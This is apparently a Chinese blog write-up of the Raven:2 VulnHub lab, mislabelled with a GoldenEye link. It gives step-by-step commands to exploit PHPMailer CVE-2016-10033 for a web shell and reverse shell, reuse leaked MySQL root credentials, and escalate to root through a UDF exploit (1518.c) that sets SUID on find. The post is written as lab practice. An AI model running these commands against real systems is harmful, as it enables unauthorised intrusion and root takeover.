> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zCcxDeQEGkX6NoPHHMTW3g)

**靶机地址：**https://www.vulnhub.com/entry/goldeneye-1,240/

**靶机难度：**中等（CTF）

靶机发布日期：2018 年 5 月 4 日

靶机描述：Raven:2 是中级 boot2root VM。有四个要捕获的标志。在多次破坏之后，Raven Security 采取了额外的措施来加固其 Web 服务器，以防止黑客入侵。您是否仍然可以破坏 Raven:2？

目标：找到四个 flag.txt 信息

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/D8K0hdvKJ0HXTG7lbicJpbKFahh3c1OHvyubVdcSpTNpsiam24fQnUoMlMTbT0NNSBSpicaCmf5nw7byndwJUpNJg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaTkdwXulYibejsYcyxr4rvsYFlicG6eOlxkTP6ibMicL0wCD7icfrZsh6vdw/640?wx_fmt=png)

这里还能使用 arp-scan -l 或者 netdiscover 来获取需要攻击主机的 IP 地址。

主机 IP：**192.168.182.142**

第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了 nmap 全端口扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZkNjW1UGncWM0dshYo39x42rmYTA3jX64yyOseZVsMzI6HYT2tBjxg/640?wx_fmt=png)

看到目标开放了 22、80、111 端口，其中 80 端口运行了一个 web 应用, 可以通过入侵 web 进入系统，由于介绍系统人员加固了改系统设置的系统口令太强，这里没进行爆破。（爆破起来估计要几天...）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia8uCkduicKjoZQJExdKexnrGGyzibC7GzSJaiapfibrZUtaNIlqlDroWVicg/640?wx_fmt=png)

我打算使用 dirb 进行目录爆破，这里我在重复介绍一次 dirb

dirb 是一个轻量级的目录爆破工具，可以用它来快速的对目录进行一个简单的探测

dirb 默认使用的爆破字典 /usr/share/dirb/wordlists/common.txt

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaxDYjnk38etziaiahFiaARk8m4ibDX1Gd0yIuqRF0SPwUIJLXp5AnnsOPibQ/640?wx_fmt=png)

扫了我 10 多分钟... 看到了好多目录，一个一个从往下看，然后找到 http://192.168.182.142/vendor 目录有个目录遍历。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia4E1PnRkPm1ArwazI4icqZsUnfg3CcFDBuyqXbA5nn2m3hsyzPjibn63A/640?wx_fmt=png)

然后继续一个一个打开看，信息收集过程就是这样，要有耐心....

很顺利的在 PATH 文件里面发现 flag1

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaiaMGlHcTt0RCTE0tvAonybAnicT59AOsGcljAjmThh9ibIYLFniaJsIRcg/640?wx_fmt=png)

获得网站绝对路径：/var/www/html/vendor/

flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}

按照难度，应该不会有第二个 flag2 能这么简单找到了.... 但是还是一个一个往下看.... 无用的信息我就过滤不写出来了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaE5Oaex5NDnSnghbM7pccZk6Q6S4X0QR1PM93X2ubGPKnr5YZWAuBPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaAyR04XVNJz1ib3ZRVMciabFLocppgBdpgPaGGIMxTMQCBY9xxqVkDxQQ/640?wx_fmt=png)

我们在 README.md 文件中看出来这个靶机有一个 PHPMailer 邮件服务

版本是 5.2.16

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

二、漏洞利用

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

搜索 PHPMailer 版本小于 5.2.20 存在远程代码执行漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaqY0lNXBtZGAQwhEhzXaS2gJOFWTYJ5KaYl9CRlsictZkf2zVbLQ7rdw/640?wx_fmt=png)

使用 searchsploit 搜索可以利用的漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaYDuIUqOyAj4Awazmvj6Upj4sq8BMO8G492h9ibicILSZnY8AupgAVCjg/640?wx_fmt=png)

也可以到 exploit-db.com 搜索，并发现利用 exp 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaV4T7ZmdmFFNLGibQHReZhgo5g2aZAP3zBfzbGJZJpGKCYwgOWJ7DyUw/640?wx_fmt=png)

漏洞的编号为 CVE-2016-10033

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniakaco1HiaKVhNvvN2bic2bPicOZFLwiaRpqXh9RpXTicbsk957GQlToySYjA/640?wx_fmt=png)

命令：cp /usr/share/exploitdb/exploits/php/webapps/40974.py /root

将 exp 考出，需要针对 PHPMailer 修改参数

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaxHeYup7DJmBNicaia6LGwDy2mkhXaZ5wldRjtnWmTfKzjtJHUNW7MctA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniayYiaUwBevJVsfbkic2IchZwfOFYyTPvmtx3v7FrdZVy9SZ5Nia4xTVNBw/640?wx_fmt=png)

我这边把 40974.py 改名：dayu.py 了

这边如果第一次用 python 执行 shell 的话，python dayu.py

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia5HFMXpkGk3V93kP6ODWww0Q8U5dyQVwuUZr7U3Yib6vr4zGu9QGrYBg/640?wx_fmt=png)

会报错，需要安装 requests_toolbelt 模块，使用命令：pip install requests-toolbelt 安装即可，如果没用 pip，需要 sudo apt-get install python-pip 安装即可。

执行 python dayu.py 

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia1GN0iaAqp41O5qyHLZPwD35hUMbS2TBJyblUI13ZNfCJdYoMUGbiav0g/640?wx_fmt=png)

访问 contact.php(http://192.168.182.142/contact.php), 此时就会生成后门文件 shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZPFOtCKnlaDF5ib1bzwuxMWePlw8tb80GAIo9ROyk7IyZHARw4RuicUA/640?wx_fmt=png)

接着访问后门文件：http://192.168.182.142/shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniauUFibzz387r69pcKicTnmE6R5sic9bpyiaVroBGk08NLvWO90iag7T7yjYQ/640?wx_fmt=png)

这边用 nc 开启监听服务，成功用 python shell 拿到了低权限 www-data

继续用 python 获取 pty，前面两章都有介绍

命令: python -c 'import pty;pty.spawn("/bin/bash")'

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaickZaaKNKC20uUGwsQ7GKCVcgr9bIreBJiaYicK9aLRRicwmKFpISq3kibQ/640?wx_fmt=png)

这边目标是拿到四个 flag 文件，目前只拿到了一个。

我尝试使用 find 查看 cd /var 目录下是否有 flag 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaA14hvqUKwJUdzdQZ1otficbJGANYeOsHwNTFMwNcQ6t2YMUfu6fozCA/640?wx_fmt=png)

这里很幸运的找到了 flag2 和 flag3，我们进入获取信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia7lGO7xJ9oAebmde15nFn0MSr1hbmWnaibsrlv3eSElpTVrjSAn4iaicicw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniatCS4I4bLCNb2ib0ib4p5y4D9vhhpBOtiaq67lNh1E5bNBFOCianH2IJUag/640?wx_fmt=png)

这里 flag3 在图片里是 png 文件，直接 web 访问就能查看：http://192.168.182.142/wordpress/wp-content/uploads/2018/11/flag3.png

下一步是要获取靶机 root 权限才能查看 flag4.txt 这又要开始一波艰难的旅程了....

去网站根目录下看看有没有什么有用的信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaO5jaWphPURtQ1LhImlFicTW7qluibPsZ1y8WJhicH5tpb3qh3UvZEGGpg/640?wx_fmt=png)

找到一个目录 wordpress

进去有一个 config，配置文件，查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaHqtf3oOibrhiazEConSGlpUqwycAInr0nNrtuzKT7xmicyAs6glY5J6Sg/640?wx_fmt=png)

用户：root，密码：R@v3nSecurity

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

三、权限提升

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

发现数据库 root 登录的密码

在这里利用 Linux 枚举漏洞工具 LinEnum（数据库渗透好东西）

下载地址：https://github.com/rebootuser/LinEnum

下载完，我们用 python 搭建以一个简易的服务器来把文件下载到靶机里面

命令：python -m SimpleHTTPServer 5555

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaqqicTiadHvicqKNXcepH5E8aOicTXw1G6AHydqHaZgz7nFAWGib5KXLI4AA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniavrVibO5MqAFONqNo0FF4Ecy7L7yGfASETclI9VKFFYnMSv7HjT8iaEAQ/640?wx_fmt=png)

上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniauDRILkmEamRUCkq61rJJWYGvpgic3wxXUp4vXg9IOqydfCDSqOezj2A/640?wx_fmt=png)

需要提权，chmod 提权后./LinEnum.sh 执行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaicbHUD4CgOPicjAHf9XDB5eG9AMnTthRBiba7bicABYica0YKhTcoEpttcA/640?wx_fmt=png)

可以查看到 Mysql 是用 root 登陆的，还有另外一种简单的方法... 脑补完才知道

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniayN97C8yl2POxxLic06GGALjV1PQhjQHm4YnZcHYWWYxlzpvicWN6YTJA/640?wx_fmt=png)

或者使用命令：ps aux | grep root，查看到当前以 root 用户身份运行的所有进程。（最近在脑补数据库漏洞利用）...

现在要查找 MySQL 版本

进入 mysql 数据库终端，可以查看数据库的版本，也可以查看 plugin 目录：ps -ef|grep mysql

或者使用命令：dpkg -l | grep mysqlmysql 查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaa3F2R1LHlhRibuNYSLIl0xHbrFIOxCMHKnIibTjSPzZpR1tSWedobd5A/640?wx_fmt=png)

命令：dpkg -l | grep mysql

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaicMlGhfA630cFPRe9jOlUDjzbibjOlRIsiayRic7ZuETibuWIyBAnCpv0lw/640?wx_fmt=png)

命令：mysql -u root -pR@v3nSecurity

命令：select version();

可以看到运行是 5.5 版，还有另外一种方法查看我使用了梯子访问谷歌查看了很多信息，此版本的 MySQL 容易受到 UDF（用户定义函数）漏洞的攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaicsM9Ewx9hGzNDptT5083c6H1G6C4fYKmTibwTzx6KepSicpwB7mUqG7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniah3sibtjflnTtKFjlxayDW2dq9lP7kaHdjJjhwB8La4fMTgAmQ6ZTygA/640?wx_fmt=png)

可以利用 1518.c 这个 UDF 特殊漏洞

MySQL 中 UDF 漏洞学习：https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html

（这里我是用谷歌翻译来慢慢学习的，耐心学习每个漏洞！！）

想获取 1518exploit 有两种方法：

1）获取地址：https://www.exploit-db.com/exploits/1518

2）也可以在 kali 里面搜索，我还是比较喜欢使用 kali

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaic3uS8cJxEdVO2Z0YW8IZ1y3hLVW03U56fHicjdhd98u19wASzcd0znw/640?wx_fmt=png)

命令：searchsploit 1518.c

命令：cp /usr/share/exploitdb/exploits/linux/local/1518.c /root 拷出

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniawVhVrgFVN7178erCwjxASkt0fiaQcJ0fJG3fggUoUyWxEpW0ib1Gpjiaw/640?wx_fmt=png)

接着就是利用提权 exp 的利用了 1518.c 在 kali 上进行编译生成 so 文件：

命令：gcc -g -c 1518.c

命令：gcc -g -shared -o dayu.so 1518.o -lc

-g 生成调试信息

-c 编译（二进制）

-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。

-o：执行命令后的文件名

-lc：-l 库 c 库名

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia5vw2grticdiamXSicDUQ7tc70IVazfiaFKicuSe0HKtoicaFr6BPRf9Xia9Xg/640?wx_fmt=png)

使用前面的 python 5555 服务传输到靶机

然后通过 mysql 进行 UDF 提权

进入数据库创建数据表 foo

命令：create table foo(line blob);

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaF6NboN27hVJOxmuWmJo8Zw7BCnIpGOicvgjJ9wO4FZa7ia0r8hd2GIQA/640?wx_fmt=png)

插入数据：insert into foo values(load_file('/tmp/dayu.so'));

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaFbHUju1eLa1fHPE8yDt6NmeS8Dz0LfLLIPlWTzeqice2B66ibwUvLeJQ/640?wx_fmt=png)

Foo 表成功插入二进制数据，然后利用 dumpfile 函数把文件导出

outfile 多行导出，dumpfile 一行导出

outfile 会有特殊的转换，而 dumpfile 是原数据导出

新建存储函数

命令：select * from foo into dumpfile '/usr/lib/mysql/plugin/dayu.so';

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaNkvHZnpw6oGYhyDywnJQ2yxg6TB2Rf5IvMicz244Q5IFsxxbUlmPqgw/640?wx_fmt=png)

创建自定义函数 do_system 类型是 integer，别名（soname）文件名字

然后查询函数是否创建成功

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniawaUGzBBoia74qCFZkibbBGMxJwAI4ics0elMXIwHXRjCpfw2cGT4oiaUCg/640?wx_fmt=png)

命令：create function do_system returns integer soname 'dayu.so';

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaKxj0p0ZGpLmD8gGIu2iaJj25eH2Cic8ic09QKyGdic05NYibmprCkbnUspA/640?wx_fmt=png)

调用 do_system 函数来给 find 命令所有者的 suid 权限，使其可以执行 root 命令

命令：select * from mysql.func;

命令：select do_system(‘chmod u+s /usr/bin/find’);

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniayF44bI0sX1K3RfR0766pcqTiaAibSibb0iazYUhn1RzOKaseiasbATibrZZw/640?wx_fmt=png)

执行 find 命令

使用 find 执行 shell

命令：find / -exec '/bin/sh ’ \ ;

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniarYm9pSNo4IzBJBwcEF3yLOpiaqJO2oQFic2Eib1ME77l1IfQI3iczQNJYw/640?wx_fmt=png)

成功提权查看 flag4.txt

经过上手演示这靶机不是中等水平..... 我花了两天时间利用各种时间学习，写了这篇文章，开始很多不懂，没思路，都是看各国渗透专家的方式方法，一步一步慢慢学习才写出来的，希望能帮助大家，也是巩固加深我的印象，如果非常喜欢就坚持下去！！！

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/D8K0hdvKJ0HXTG7lbicJpbKFahh3c1OHvyubVdcSpTNpsiam24fQnUoMlMTbT0NNSBSpicaCmf5nw7byndwJUpNJg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaIlQnxBnPxa95sTicYQ6Fg7uIPxpK9VNNibnv4qjxpcJbWFnjbStaSUVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HdnE6icjq3eZPJygSy2mR5Ax3mF0zbepD8wmYU9I1bm8ib991icToQ8wVaweOEGRHbsxe2wMVFN8GZ1Egzbict2RHA/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流渗透，一起成长学习！

![](https://mmbiz.qpic.cn/mmbiz_png/xsbHqF7AIDaKRb2LB6ykjvMB9uh7oLtyPpVdwZZW8a1eSW7CibZfDmCmT7UXWNnJMsogxXyreyY9AyR1WvNicsYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaAPyzQq8Y6flPMewUURAPYJVN8WTAl8BMqBiasuMSf7MKPMnlYJFAwPg/640?wx_fmt=png)